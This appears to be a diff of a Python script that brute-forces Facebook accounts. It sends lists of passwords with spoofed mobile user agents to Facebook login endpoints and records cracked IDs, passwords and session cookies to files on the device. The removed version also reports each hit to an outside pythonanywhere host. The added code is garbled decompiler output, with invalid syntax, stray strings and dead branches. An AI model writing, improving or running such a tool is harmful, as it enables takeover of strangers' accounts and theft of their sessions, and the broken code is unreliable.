@@ -882,74 +882,68 @@ android_version1 = random.choice(['11', '10'])
 android_model1 = random.choice(['SM-M022G'])
 useragent = ('Mozilla/5.0 (Linux; Android {};{} Build/{}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 SamsungBrowser/7.4 Chrome/{} Mobile Safari/537.36'.format(android_version1, android_model1, build1, browser_version1))
 
-def m1(idf,pwv):
-    global loop, ok, cp
-    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
-    sys.stdout.write(f'\r{P} [{animasi}-{H}M1{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
-    sys.stdout.flush()
-    az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
-    rr = random.randint
-    rc = random.choice
-    ugen1 = f"Mozilla/5.0 (Linux; Android {str(rr(10,13))}; Redmi Note 9 Pro Max Build/QKQ1.{str(rr(111111,999999))}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.{str(rr(1111,9999))}.{str(rr(11,99))} Mobile Safari/537.36"
-    pro = random.choice(ugen)
-    for pw in pwv: 
-        try:
-            session = requests.Session()
-            pw = pw.lower()
-            get = session.get(f"https://m.prod.facebook.com/login/?email={idf}&pass={pw}&locale2=id_ID")
-            date = {
-            "lsd":re.search('name="lsd" value="(.*?)"',str(get.text)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"',str(get.text)).group(1),
-            "li":re.search('name="li" value="(.*?)"',str(get.text)).group(1),
-            "email":idf,"pass":pw,"Host":"https://m.prod.facebook.com/login/save-device/?login"}
-            respons =({
-            'Host': f'm.prod.facebook.com',
-           'accept': 'image/webp,image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5','accept-encoding': 'gzip,deflate',
-           'accept-language': 'es_LA,id;q=0.9','content-length': f'{str(rr(1111,9999))}',
-           'content-type': 'application/x-www-form-urlencoded','origin': 'https://m.facebook.com',
-           'referer': f'https://m.facebook.com/reg/?cid=103&refid=8',
-           'user-agent': pro,
-           'sec-fetch-dest': f'{random.choice(["empty","document"])}',
-           'sec-fetch-mode': f'{random.choice(["navigate","cors"])}',
-           'sec-fetch-site': f'{random.choice(["none","same-origin"])}',
-           'sec-fetch-user': f'{random.choice(["?1","empty"])}',
-           'x-requested-with': 'www.facebook.com',
-           'x-xss-protection': '0',
-           'sec-ch-ua': '" Not A;Brand";v="99", "Microsoft Edge";v="101", "Chromium";v="101"',
-           'sec-ch-ua-mobile': '?0'})
-            yz = session.post(f'https://m.prod.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100', headers=respons, data=date, allow_redirects=False)
-            if "checkpoint" in session.cookies.get_dict().keys():
-             idd = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-             cp+=1
-            if 'y' in cp_xdx:
-                print(f'\r{P} [\033[1;30mATOM-CP{P}] \033[1;30m{idd}|{pw}{xxx}')
-                open(' /sdcard/ATOM-CP.txt', 'a').write(idf+'|'+pw)
-                cp.append(idf)
-                break
-            elif "c_user" in session.cookies.get_dict().keys():
-                coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                idg = re.findall('c_user=(.*);xs', coki)[0]
-                url = f"https://shishirx.pythonanywhere.com/lock?uid={idf}"
-                reqx = requests.get(url).text
-                if 'live' in reqx:
-                 print(f'\r\r{G}[ATOM-LIVE-RECEIVED]: {idg} | {pw}')
-                 open('/sdcard/ATOM-M1-live-OK.txt','a').write(idg+'|'+pw+'|'+coki+'\n')
-                 ok+=1
-                 break
-                if 'lock' in reqx:
-                 print(f'\r\r{G}[ATOM-DIE-RECEIVED]: {idg} | {pw}')
-                 open('/sdcard/ATOM-M1-die-OK.txt','a').write(idg+'|'+pw+'|'+coki+'\n')
-                 ok+=1
-                 break
-            if 'y' in cokix:
-               print(f'\r{gen}{H}'+coki)
-               break
-            else:
-                continue
-        except requests.exceptions.ConnectionError:
-            time.sleep(31)
-    loop+=1
+        def m1(idf,pwv):
+        global loop
+        p = round(loop * 100 / lim, 2)
+        sys.stdout.write(f'''\r\r\x1b[1;37m [Q_T_9] [{loop!s}] \x1b[1;37m[OK={len(oks)!s}] [{p!s}%] \x1b[1;37m''')
+        sys.stdout.flush()
+        for pas in passlist:
+            application_version = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(111, 555))
+            application_version_code = str(random.randint(0, 999999999))
+            fbs = random.choice(fbks)
+            gtt = random.choice(xxxxx)
+            gttt = random.choice(xxxxx)
+            android_version = str(random.randrange(6, 13))
+            ua_string = f'''Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/''' + '{density=2.0,width=720,height=1280};' + f'''FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'''
+            device_id = str(uuid.uuid4())
+            adid = str(uuid.uuid4())
+            data = {
+                'error_detail_type': 'button_with_disabled',
+                'enroll_misauth': 'false',
+                'generate_session_cookies': '1',
+                'generate_machine_id': '1',
+                'locale': 'en_US',
+                'client_country_code': 'US',
+                'fb_api_req_friendly_name': 'authenticate',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler' }
+            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+            headers = 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1'
+            url = 'https://p.facebook.com/auth/login'
+            twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
+            po = requests.post(url, data = data, headers = headers).json()
+            if 'session_key' in po:
+                uid = po['uid']
+                'user-agent'
+                uid = ids
+                if str(uid) in oks:
+                    '1'
+                print('\r\r\x1b[1;32m [Q_T_9-OK] ' + str(uid) + ' | ' + pas + '\x1b[1;97m')
+                coki = (lambda .0: for i in .0:
+i['name'] + '=' + i['value']None)(po['session_cookies']())
+                open('/sdcard/Q_T_9-COOKIE.txt', 'a').write(coki + '\n')
+                open('/sdcard/Q_T_9_OK.txt', 'a').write(str(uid) + '|' + pas + '\n')
+                oks.append(str(uid))
+                ';'.join
+            if 'www.facebook.com' in po['error']['message']:
+                uid = po['error']['error_data']['uid']
+                'upgrade-insecure-requests'
+                uid = ids
+                if uid in oks:
+                    pass
+                print('\r\r\x1b[38;5;208m [Q_T_9-CP] ' + str(uid) + ' | ' + pas + '\x1b[1;97m')
+                open('/sdcard/Q_T_9-CP.txt', 'a').write(str(uid) + '|' + pas + '\n')
+                cps.append(str(ids))
+                '?1'
+            loop += 1
+            return None
+            if Exception:
+                e = 'sec-fetch-user'
+                e = None
+                del e
+                return None
+            e = 'sec-fetch-user'
+            del e
+
 
 def m2(idf,pwv):
  global loop,ok,cp
